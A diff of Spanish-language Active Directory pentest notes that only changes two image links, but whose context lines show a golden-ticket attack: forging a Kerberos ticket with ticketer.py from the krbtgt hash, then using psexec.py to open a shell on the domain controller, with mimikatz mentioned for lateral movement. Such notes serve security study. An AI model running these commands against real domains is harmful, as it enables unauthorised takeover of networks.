@@ -14,7 +14,7 @@ Ahora creamos un ticket con ticketer.py ejecutando el siguiente comando:
 ```
 ticketer.py -nthash <hash_NTLM> -domain-sid <sid_krbtgt> -domain <dominio> <nombre_exportación>
 ```
-[Ver ejemplo](Images/users/README.md)
+[Ver ejemplo](/Apuntes-AD/Images/15.md)
 
 Tenemos que exportar una variable de entorno con la ruta del ticket.
 ```
@@ -24,7 +24,7 @@ Ahora con `psexec` podemos conectar directamente al DC sin proporcionar contrase
 ```
 psexec.py -n -k <dominio>/<domain_admin>@<nombre_DC> cmd.exe
 ```
-[Ver ejemplo](Images/sesion/README.md)
+[Ver ejemplo](/Apuntes-AD/Images/16.md)
 
 # Movimiento Lateral
 Podemos crear un `golden.kirbi` para cargarlo con mimikatz en una máquina y ganar privilegios de acceso a un equipo, para ello en una sesión de mimikatz haremos lo siguiente:
